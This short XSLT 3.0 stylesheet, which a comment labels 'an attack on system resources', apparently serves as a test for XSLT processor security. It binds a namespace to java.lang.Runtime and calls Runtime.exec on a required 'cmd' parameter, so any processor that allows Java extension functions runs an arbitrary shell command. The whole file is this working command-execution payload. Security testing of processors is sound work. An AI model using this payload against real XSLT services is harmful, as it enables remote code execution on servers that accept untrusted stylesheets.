<?xml version="1.0" encoding="UTF-8"?>
<!-- this is an attack on system resources -->
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:xs="http://www.w3.org/2001/XMLSchema"
    xmlns:run="ext://java.lang.Runtime"
    exclude-result-prefixes="#all"
    version="3.0">

   <xsl:output method="text"/>

   <xsl:param name="cmd" as="xs:string" required="true"/>

   <xsl:template match="/">
      <xsl:value-of select="run:exec(getRuntime(), $cmd)"/>
   </xsl:template>

</xsl:stylesheet>
